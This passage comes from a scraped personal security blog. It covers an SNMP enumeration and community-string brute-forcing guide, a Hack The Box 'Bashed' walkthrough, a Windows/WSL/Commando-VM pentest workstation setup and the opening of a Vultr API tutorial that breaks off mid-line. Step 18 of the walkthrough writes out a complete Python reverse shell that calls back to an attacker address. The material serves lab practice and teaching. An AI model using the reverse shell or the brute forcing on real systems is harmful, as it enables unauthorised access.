enumerate the SNMP devices and places the output in a very human readable friendly format. It could be useful for \npenetration testing or systems monitoring.\n\n```\nsnmp-check -w ip_address\n-p, --port : SNMP port; default port is 161;\n-c, --community: SNMP community; default is public;\n-v, --version : SNMP version (1,2c); default is 1;\n-w, --write : detect write access (separate action by enumeration);\n-d, --disable_tcp : disable 'TCP\n```\n\n## snmpset\n\nIf we find write access to an SNMP server we can use snmpset to write to it.\n\n`snmpset` - communicates with a network entity using SNMP SET requests\n\n## Onesixtyone\n\nOnesixtyone is an SNMP scanner that sends multiple SNMP requests to multiple IP addresses, trying different community strings and waiting for replies.\n\nKey Features\n* Very fast scanning speed (over 50,000 guesses per second)\n* Scan a single host or thousands of hosts at the same time\n* You can tune scan speed to support both LAN and WAN testing\n\n### Prepping Your Dictionary\n\nSNMP strings in onesixtyone can't be longer than 16 characters at time of this writing. If you have an error with your dictionary file you can find out which words are causing problems with the following command.\n\n```  \ncat snmpstrings.txt | grep -xv .\\{0,16\\}\n```  \n\nThere is a current approve request in onesixtyone to increase the size as currently the following string which is default in the kali linux wordlists for snmp community strings can not be parsed for onesixtyone.\n\nThis is the APC default community string:\n```  \nTENmanUFactOryPOWER\n```  \n\nHowever if you wish to use onesixtyone and you need to filter your list down you can do the following to pipe all the words between 0-16 characters into a new list\n```  \ncat snmpstrings.txt | grep -x '.\\{0,16\\}' > snmp.txt\n```  \n\n### Example usage\n\nScanning Hosts/Community Strings From Files\n```\nonesixtyone -c snmp.txt -i opensnmp.txt \n-i = This flag allows you to input hosts from a list\n-c = This flag allows you to input community strings from a list.\n```\n\nScanning a single host.\n```  \nonesixtyone -c /dict/snmp.txt 10.0.0.1\n```  \n\n### Key Flags\n```  \n-c = file with community string names to try\n-i = file with target hosts\n-o = output log\n-d = debug mode\n-w = Wait in milliseconds between sending packets (default 10)\n-q = Quiet mode, do not print to std out.\n```  \n\nBrute Force And Scan Network SNMP bruteforce script.\n```\nroot@kali:/# echo \"public\" > community\nroot@kali:/# echo \"private\" > community\nroot@kali:/# echo \"manager\" > community\nroot@kali:/# for ip in $(seq 200 254); do echo 192.168.19.$ip ;done > ips.txt\nroot@kali:/# onesixtyone -c community -i ips.txt\n```\n\n## SNMP with NMAP\n\nThis is a standard network scan looking for potential snmp open port hosts.\n\n```bash\nnmap -Pn -sU -sV -p 161 --open 10.0.0.1/24\n-Pn = Treat all hosts as online \n-sU = Specifys a UDP Scan\n-p = Specify the port\n-sV = Specify to perform service enumeration\n--open = Returns on Open Ports\n```\n\nThis should hopefully tell us the version number of the SNMP. Now we can run nmap with scripts to further enumerate\n```  \nnmap -Pn -sU -p 161 10.0.0.1 --script=snmp-brute\n```  \n\n### NMAP NSE Scripts for SNMP\n\n```  \ncd \"/usr/share/nmap/scripts\"\nls -la | grep \"snmp\"\n```\n\n#### Flags\n\n```  \nsnmp-brute = Attempts to find an SNMP community string by brute force guessing\nsnmp-hh3c-logins = Attempts to enumerate Huawei / HP/H3C Locally Defined Users\nsnmp-info = Extracts basic information from an SNMPv3 GET request\nsnmp-interfaces = Attempts to enumerate network interfaces through SNMP\nsnmp-ios-config = Attempts to download Cisco router IOS configuration files\nsnmp-netstat = Attempts to query SNMP for a netstat like output\nsnmp-processes = Attempts to enumerate running processes through SNMP\nsnmp-sysdescr = Attempts to extract system information from an SNMP version 1 service\nsnmp-win32-services = Attempts to enumerate Windows services through SNMP\nsnmp-win32-shares = Attempts to enumerate Windows Shares through SNMP.\nsnmp-win32-software = Attempts to enumerate installed software through SNMP.\nsnmp-win32-users = Attempts to enumerate Windows user accounts through SNMP\n```"},{"fields":{"slug":"/bashed-on-hack-the-box"},"excerpt":null,"frontmatter":{"date":"3rd December 2020 ","title":"Bashed on Hack The Box","description":"","tags":"htb, bashed, ctf","posttype":"ctf"},"body":"<h5 class=\"step\">1 Initial Nmap Scan</h5>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/59862a89-3865-4a4e-90ca-a91760f02714.png\" class=\"img-fluid\" alt=\"Initial NMAP scan\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Initial NMAP scan.</figcaption>\n</figure>\n\n<h5 class=\"step\">2 Nmap Follow Scan all HTTP Scripts</h5>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/a17fd479-7fa2-4648-8054-e03dfd52feaa.png\" class=\"img-fluid\" alt=\"Nmap Follow Scan all HTTP Scripts\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Nmap Follow Scan all HTTP Scripts.</figcaption>\n</figure>\n\n<h5 class=\"step\">3 Apache 2.4.18 on Ubuntu</h5>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/2609bdc9-db65-403d-b59b-64a53eff3872.png\" class=\"img-fluid\" alt=\"Apache 2.4.18 on Ubuntu\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Apache 2.4.18 on Ubuntu.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">4 DEV Path</h5>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/fa88a3bb-f4ba-48c0-841b-b7f8445dd204.png\" class=\"img-fluid\" alt=\"DEV Path\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">DEV Path.</figcaption>\n</figure>\n\n\n\n<h5 class=\"step\">5 PHP Bash Shell</h5>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/cf425f0d-2460-4ee0-9cbf-4c1feffdb9f2.png\" class=\"img-fluid\" alt=\"PHP Bash Shell\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">PHP Bash Shell.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">6 Enumeration</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/c398a0b5-0410-4097-8767-0e80b7425f9e.png\" class=\"img-fluid\" alt=\"Enumeration\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Enumeration.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">7 Create Shell</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/0721dbe3-1383-4b3f-bb45-d47fddbd3d23.png\" class=\"img-fluid\" alt=\"Create Shell\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Create Shell.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">8 Host Shell</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/3fd8b6d2-f218-44ab-be6e-a37f00bf128c.png\" class=\"img-fluid\" alt=\"Host Shell\"></h5>\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Host Shell.</figcaption>\n</figure>\n\n<h5 class=\"step\">9 Web Delivery Metasploit</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/07224f64-52f0-41b5-bd31-d06ec87d06f8.png\" class=\"img-fluid\" alt=\"Web Delivery Metasploit\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Web Delivery Metasploit.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">10 Upgrade-metasploit-meterpreter</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/cd810c67-172a-4cd8-9c85-fb6ec5b75197.png\" class=\"img-fluid\" alt=\"Upgrade-metasploit-meterpreter\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Upgrade-metasploit-meterpreter.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">11 Enumerate</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/33f8e494-7f47-4e71-bec4-b33c873f8770.png\" class=\"img-fluid\" alt=\"Enumerate\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Enumerate.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">12 Sudo -l</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/d1e4b1e4-29f9-4b79-a775-54096d7b09c8.png\" class=\"img-fluid\" alt=\"Sudo -l\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Sudo -l.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">13 TTY Shell</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/9113ff77-4e0e-49ae-8c32-7d3747ae2eb3.png\" class=\"img-fluid\" alt=\"TTY Shell\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">TTY Shell.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">14 Files-Owned-By-Scriptmanager</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/15c8cd1a-0aee-4a1b-9d4e-2d3ff7373242.png\" class=\"img-fluid\" alt=\"Files-Owned-By-Scriptmanager\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Files-Owned-By-Scriptmanager.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">15 File Fun By Root</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/d53ee8c9-cf63-4dc2-b260-d022db0902f6.png\" class=\"img-fluid\" alt=\"File Fun By Root\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">File Fun By Root.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">16 Spawn Shell As Scriptmanager</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/a0003e41-6f89-409f-af41-c6fb5ab9c746.png\" class=\"img-fluid\" alt=\"Spawn Shell As Scriptmanager\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Spawn Shell As Scriptmanager.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">17 Content Discovery</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/ec5f1398-7837-485b-8713-ee5eaaff6f5d.png\" class=\"img-fluid\" alt=\"Content Discovery\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Content Discovery.</figcaption>\n</figure>\n\n\n\n<h5 class=\"step\">18</h5>\n\n```\necho 'import socket,subprocess,os' > test.py echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)' >> test.py echo 's.connect((\"10.10.14.26\",4432)) ' >> test.py echo 'os.dup2(s.fileno(),0)' >> test.py echo 'os.dup2(s.fileno(),1)' >> test.py echo 'os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' >> test.py \n```\n\n<br>\n<h5 class=\"step\">19 Got Root</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/27fae913-299a-4eae-aa07-790fa64d219a.png\" class=\"img-fluid\" alt=\"Got Root\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Got Root.</figcaption>\n</figure>\n\n\n<h5 class=\"step\">20 Overide Test Py</h5>\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/026ce1c5-4b48-4415-a6af-f7ff37cbc7e4.png\" class=\"img-fluid\" alt=\"Overide Test Py\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Overide Test Py.</figcaption>\n</figure>"},{"fields":{"slug":"/customising-windows-10"},"excerpt":null,"frontmatter":{"date":"21st September 2020 ","title":"Customising Windows 10","description":"This guide is going to take you through a number of components to get your machine ready for subsequent parts of this guide.","tags":"customising-windows, vms, vmware, windows","posttype":"article"},"body":"\nThis guide is going to take you through a number of components to get your machine ready for subsequent parts of this guide. \n\n### Preparing\n\nHit the Windows key and type `cmd`.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/734c9b10-1b51-4fb7-81d1-d56a5156429d.png\" class=\"img-fluid\" alt=\"Opening Windows CMD Prompt from Start Menu\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Opening Windows CMD Prompt from Start Menu.</figcaption>\n</figure>\n\nHold down `CTRL` + `SHIFT` and now hit the `Enter` key to open the command prompt as an elevated user. \n\nNow hit the Windows key and type `PowerShell`\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/e02c6fea-e50d-4b4d-9bf0-d6734745df23.png\" class=\"img-fluid\" alt=\"Elevated PowerShell Prompt\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Elevated PowerShell Prompt.</figcaption>\n</figure>\n\nHold down `CTRL` + `SHIFT` and now hit the `Enter` key to open the PowerShell prompt as an elevated user. \n\nWindows Version\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n  <img src=\"/static/1e875c32-3ae8-4948-b3c4-8d8d0704f647.png\" class=\"img-fluid\" alt=\"Windows Version Information Displayed Via winver Command\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Windows Version Information Displayed Via winver Command.</figcaption>\n</figure>\n\n## PowerShell 7\n\nQuick one-liner to install the latest version (PowerShell 7 is current at time of print) on Windows\n```\niex \"& { $(irm https://aka.ms/install-powershell.ps1) } -UseMSI\"\n```\n\nFollow the Wizard to the step headed \"Optional Actions\" and check the selection to \"Enable PowerShell remoting\". I also like to select \"Add 'Open here' context menus to Explorer\". \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/747d8148-d1a5-49f1-b37a-20a03d0726e4.png\" class=\"img-fluid\" alt=\"PowerShell 7 Installing Optional Actions\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">PowerShell 7 Installing Optional Actions.</figcaption>\n</figure>\n\nSelect the \"Launch PowerShell\" in the bottom left of the next wizard. \n\nNow \"Right Click\" the PowerShell icon and select \"Pin to taskbar\". \n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n <img src=\"/static/b5b9a5ef-6cab-469e-b646-cdf2e102ab88.png\" class=\"img-fluid\" alt=\"Right click pin to taskbar\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Right click pin to taskbar.</figcaption>\n</figure>\n\nNow enter `$PSVersionTable` to confirm the version of PowerShell. \n\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/d5102f1f-3474-4de9-b731-3c000bbff513.png\" class=\"img-fluid\" alt=\"PowerShell 7 Get Version Information with $PSVersionTable\"><figcaption class=\"figure-caption text-center fw-normal text-dark\">PowerShell 7 Get Version Information with $PSVersionTable.</figcaption>\n</figure>\n\nTo install on Linux\n```\nwget https://aka.ms/install-powershell.sh; sudo bash install-powershell.sh; rm install-powershell.sh\n```\n\n## WSL\n\nWSL version 2 is real Linux on real Windows :)\n\nNext, we will install the Windows Subsystem for Linux and the VirtualMachinePlatform. \n\nDism vs Enable-WindowsOptionalFeature\n\n```\ndism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n```\n\n```\nEnable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux -NoRestart\nEnable-WindowsOptionalFeature -Online -FeatureName VirtualMachinePlatform -NoRestart\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/f01e5588-7993-4a9a-963f-0a6f28881677.png\" class=\"img-fluid\" alt=\"Installing Optional Features\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Installing Optional Features.</figcaption>\n</figure>\n\n\nSetting version 2 of the Windows Subsystem for Linux to the default\n```\nwsl –set-default-version 2\n```\n\nIf you get an error message saying \n    \n> WSL 2 requires an update to its kernel component. For information please visit https://aka.ms/wsl2kernel\n    \nThis means you need to install the MSI another component. \n\nGo to [https://aka.ms/wsl2kernel](https://aka.ms/wsl2kernel)\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/20b5093a-ed64-44f2-9f85-330caca77ad6.png\" class=\"img-fluid\" alt=\"Download the Linux Kernel Update package for WSLv2\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Download the Linux Kernel Update package for WSLv2.</figcaption>\n</figure>\n\nDownload by clicking the link \"WSL2 Linux kernel update package for x64 machines\"\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/c7684b40-9f63-46d9-aa4f-2ed48d6c4bfc.png\" class=\"img-fluid\" alt=\"Click the msi installer\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Click the msi installer.</figcaption>\n</figure>\n\nIf at this point you need to restart your virtual machine. \n```\nrestart-computer -Confirm\n```\n\nList various versions of Linux \n```\nwsl --list\nwsl -l -v\n```\n\nListing versions we can see the difference\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/dc8ef383-d7c5-4d2d-9be0-90afdb2b03ce.png\" class=\"img-fluid\" alt=\"Using the wsl --list versions command\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Using the wsl --list versions command.</figcaption>\n</figure>\n\nWe will want to upgrade any WSL Linux machines running version 1 (Hyper-V method)\n\nReasons to upgrade to WSLv2 [Reasons to Upgrade to WSLv2](https://docs.microsoft.com/en-gb/windows/wsl/about)\n\n```\nwsl --set-version kali-linux 2\n```\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/edde105e-d633-41fc-a530-09a3eea6a75d.png\" class=\"img-fluid\" alt=\"Coverting Kali-Linux WSLv1 to WSLv2\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Coverting Kali-Linux WSLv1 to WSLv2.</figcaption>\n</figure>\n\nRun the Kali Linux Distribution\n```\nwsl -d kali-linux\n```\n\n### Debugging\n\n```\nwsl --shutdown\ndism /Online /Cleanup-Image /RestoreHealth\n```\n\nInstall Code by typing `code .`\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/c40c343c-f360-46fb-8ac9-b4b008324e35.png\" class=\"img-fluid\" alt=\"Installing Visual Studio Code\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Installing Visual Studio Code.</figcaption>\n</figure>\n\nNow type `code .` again and watch as Visual Studio opens up in the Windows Host showing files from the WSL\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/c91f8c40-7c3e-4239-b2a2-6e2e4173bb37.png\" class=\"img-fluid\" alt=\"Running and Installing Visual Studio inside WSL\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Running and Installing Visual Studio inside WSL.</figcaption>\n</figure>\n\n\n## Docker for Windows\n\nRequirements\n\n* Windows 10 64-bit: Pro, Enterprise, or Education (Build 16299 or later).\n* Hyper-V and Containers Windows features must be enabled.\n\n> **Note** - For Windows Home Edition follow this link [https://docs.docker.com/docker-for-windows/install-windows-home/](https://docs.docker.com/docker-for-windows/install-windows-home/)\n\n1. Grab the installer [https://hub.docker.com/editions/community/docker-ce-desktop-windows/](https://hub.docker.com/editions/community/docker-ce-desktop-windows/)\n\n2. Double-click the blue \"Get Docker Desktop for Windows (stable)\" button to download the executable.\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/c92e6a86-96b6-4893-a656-865c78d9f0a4.png\" class=\"img-fluid\" alt=\"Docker Installer\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Docker Installer.</figcaption>\n</figure>\n\n3. Double-Click the \"Docker Desktop Installer.exe\" to run the installer.\n\n4. When prompted, ensure the Enable Hyper-V Windows Features option is selected on the Configuration page.\n\n5. Follow the instructions on the installation wizard to authorize the installer and proceed with the install.\n\n> If your admin account is different to your user account, you must add the user to the docker-users group. Run Computer Management as an administrator and navigate to  Local Users and Groups > Groups > docker-users. Right-click to add the user to the group. Log out and log back in for the changes to take effect.\n\n## Terminal App\n\nThe terminal app is seemingly turning out to be a boon for developers and those who have always looked at Windows machines with huge expectations. The open-source terminal app boasts a range of powerful features including multiple tabs, Unicode and UTF-8 character support, and GPU accelerated text rendering engine. It’s designed to be an all-in-one platform for Command Prompt, PowerShell, WSL and SSH so that developers can have seamless access to all the tools. Even better, this all-new command-line app also features custom themes and styles for a more personalized experience\n\n[Terminal App Releases](https://github.com/microsoft/terminal/releases/)\n\nThe new Shell\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/f62567a0-2ccb-4b42-a55c-a4e2d29a1a79.png\" class=\"img-fluid\" alt=\"The New Shell\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">The New Shell.</figcaption>\n</figure>\n\nPin terminal to the taskbar\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/94d8933c-ec62-43c3-afb0-6300e5dc86a3.png\" class=\"img-fluid\" alt=\"Pin terminal to the taskbar\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Pin terminal to the taskbar.</figcaption>\n</figure>\n\n## Customisation\n\n### Cascadia Fonts\n\nNext, I am going to install [Microsofts Cascadia Code Font](https://github.com/microsoft/cascadia-code/releases)\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/0223b9ef-976a-491a-bed5-c703f8b79a3f.png\" class=\"img-fluid\" alt=\"Pin terminal to the taskbar\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Pin terminal to the taskbar.</figcaption>\n</figure>\n\nClick \"Install for all users\"\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/2c1826a5-6222-4c83-9f06-9999146253f0.png\" class=\"img-fluid\" alt=\"Install Font for all users\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Install Font for all users.</figcaption>\n</figure>\n\n### Git\n\nInstall [Git for Windows](https://git-scm.com/download/win)\n\nPosh-Git adds Git status information to your prompt as well as tab-completion for Git commands, parameters, remotes, and branch names. Oh-My-Posh provides theme capabilities for your PowerShell prompt. PSReadline lets you customize the command line editing environment in PowerShell.\n\n```\nInstall-Module posh-git -Scope CurrentUser\nInstall-Module oh-my-posh -Scope CurrentUser\n```\n\nPowerShell Core\n```\nInstall-Module -Name PSReadLine -Scope CurrentUser -Force -SkipPublisherCheck\n```\n\nOh My Posh Themes\nPick a [theme for `Oh My Posh`](https://github.com/JanDeDobbeleer/oh-my-posh#themes)\n```\nImport-Module posh-git\nImport-Module oh-my-posh\nSet-Theme Paradox\n```\n\n###Customise your Kali\n\nInstall Powerline\n```\nsudo apt install golang-go\ngo get -u github.com/justjanne/powerline-go\n```\n\nInstall Hyper for Windows\nhttps://releases.hyper.is/download/win\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/03e3cc64-862a-4dd2-9b5a-460007938604.png\" class=\"img-fluid\" alt=\"Install Hyper For Windows\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Install Hyper For Windows.</figcaption>\n</figure>\n\nWith the Hypershell open, enter the following commands\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/ad210a8d-8793-4ffc-b538-7e36b1e2d0a4.png\" class=\"img-fluid\" alt=\"Open HyperShell\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Open HyperShell.</figcaption>\n</figure>\n\n**settings.json**\n\nThe settings.json file as the name suggests contains settings for the terminal application. A few of the important settings like what should be your default profile, color scheme, key bindings, etc can be found here.\n\nTo open the default.json file hold the alt key while opening the settings.json file as mentioned above.\n\n**defaults.json**\n\nThe defaults.json file contains all the default configuration values for the terminal. This file can be used for reference, as it is an auto-generated file and contains all complete default configuration of the terminal application.\n\n## Install Chocolatey\n\nFrom an elevated PowerShell Prompt\n```\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\n```\n\nConfirm the installation of Chocolatey\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/47315b04-6d39-4fb7-b421-83d9e7f2b346.png\" class=\"img-fluid\" alt=\"Confirm the installation of Chocolatey\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Confirm the installation of Chocolatey.</figcaption>\n</figure>\n\nLet us install some packages\n\n```\nchoco install wsl-kalilinux\n```\n\n## FireEye Commando-vm\n\nDownload the latest from:\n[https://github.com/fireeye/commando-vm](https://github.com/fireeye/commando-vm)\n\nUnzip the folder.\n\nUse my custom profile evilsaint.json. \n\n<a href=\"evilsaint.json\" target=\"_blank\">Custom Profile</a>\n\nMy main additions are \n```\n{\"name\": \"wsl.fireeye\"},\n{\"name\": \"hyperv.fireeye\"},\n{\"name\": \"markdownmonster\"},\n{\"name\": \"wsl-ubuntu-2004\"},\n{\"name\": \"wsl-archlinux\"},\n{\"name\": \"wsl-debiangnulinux\"},\n{\"name\": \"microsoft-windows-terminal\"},\n{\"name\": \"everything\"},\n```\n\nI like to remove\n```\n{\"name\": \"burp.free.fireeye\"},\n```\n\n```\ncinst install <package>\n```\n\n```\ncup all\n```\n\n## Customising WSL\n\n### Kali Machine\n\n```\nsudo apt-get update\nsudo apt-get dist-upgrade\nsudo apt-get clean\nsudo apt-get --yes --force-yes install kali-desktop-xfce xorg xrdp\nsed -i 's/port=3389/port=3390/g' /etc/xrdp/xrdp.ini\nsudo apt install kali-win-kex\nsudo apt install kali-linux-large\n```\n\nRun Win-KeX\n\n* Windows mode\n* seamless mode\n\n## Moving Around \n\n```\nstart WT 'new-tab \"PowerShell\" ; split-pane -p \"KaliGeneral\" ; split-pane -H -p \"KaliC2\" | set-focus -n wsl.exe\n```\n\n```\nmkdir C:\\Users\\consultant\\AppData\\Local\\KaliC2\nwsl --import KaliC2 C:\\Users\\consultant\\AppData\\Local\\KaliC2 .\\kali-base.tar --version 1\nmkdir C:\\Users\\consultant\\AppData\\Local\\KaliGeneral\nwsl --import KaliGeneral C:\\Users\\consultant\\AppData\\Local\\KaliGeneral .\\kali-base.tar --version 2\n```\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/d65ee216-1714-45cf-b4ac-8bc5587beba9.png\" class=\"img-fluid\" alt=\"Windows Terminal Help\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Windows Terminal Help.</figcaption>\n</figure>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/41873b36-7aac-435e-8b51-1a6a566f0a31.png\" class=\"img-fluid\" alt=\"Windows Terminal Help - Split Pane\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Windows Terminal Help - Split Pane.</figcaption>\n</figure>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/21ca4b80-a019-4029-b4ea-41fa193bef73.png\" class=\"img-fluid\" alt=\"Windows Terminal Help - New Tab\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Windows Terminal Help - New Tab.</figcaption>\n</figure>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/1b6288b6-c34f-4939-b680-c11726d58814.png\" class=\"img-fluid\" alt=\"Windows Terminal Help - Focus Tab\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Windows Terminal Help - Focus Tab.</figcaption>\n</figure>\n\n<figure class=\"figure text-center col-xs-12 col-sm-12 col-lg-12\">\n<img src=\"/static/06677c06-0359-4f30-b953-8fb6cfd31724.png\" class=\"img-fluid\" alt=\"Two Versions Of Kali\">\n<figcaption class=\"figure-caption text-center fw-normal text-dark\">Two Versions Of Kali.</figcaption>\n</figure>\n\n## Customise Toys\n\n* Groupy\n* Taskbar X\n* T Clock\n* Power Toys\n* Everything\n* Rocket / Launcher\n* wox\n* sharex\n* ditto"},{"fields":{"slug":"/automating-vultr-setup-with-vultr-api-v1"},"excerpt":null,"frontmatter":{"date":"20th April 2020 ","title":"Automating Vultr Setup with Vultr API V1","description":"vultr, automation","tags":"vultr, automation","posttype":"tutorial"},"body":"```\nAPI Endpoint: https://api.vultr.com/\nAPI Key: Available in Members Area\n```\n\n### Example\n\n```\ncurl -H \"API-Key: YOURKEY\" https://api.vultr.com/v1/server/create --data \"DCID=8\" --data \"VPSPLANID=201\" --data \"OSID=270\" --data \"APPID=17\" --data \"label=docker-test\"\n```\n\nThe code example is calling Vultr API to create new Server\n\n```\n--data \"DCID=8\" = \"DCID\":\"8\",\"name\":\"London\" (server region)\n--data \"VPSPLANID=201\" = \"VPSPLANID\":\"201\",\"name\":\"1024 MB RAM,25 GB SSD,1.00 TB BW\" (plan)\n--data \"OSID=270\" = \"OSID\":270,\"name\":\"Ubuntu 18.04 x64\" (Operating System)\n--data \"APPID=17\" = \"APPID\":\"17\", \"name\":\"Docker\" (application)\n--data \"label=docker-test\" = \"label=docker-test\" (server label)\n```\n\n### cURL\n\nGET request with no arguments.\n\n```\ncurl \"https://api.vultr.com/v1/os/list\"\n```\n\nGET request that requires your API key.\n\n```\ncurl -H 'API-Key: YOURKEY' \"https://api.vultr.com/v1/server/list\"\n```\n\nGET request with additional parameters.\n\n```\ncurl -H 'API-Key: YOURKEY' -G --data \"SUBID=12345\" \"https://api.vultr.com/v1/server/list\"\n```\n\nPOST request that requires your API key.\n\n```\ncurl -H 'API-Key: YOURKEY' --data \"SUBID=12345\" \"https://api.vultr.com/v1/server/start\"\n```\n\nPOST request with additional parameters.\n\n```\ncurl -H 'API-Key: 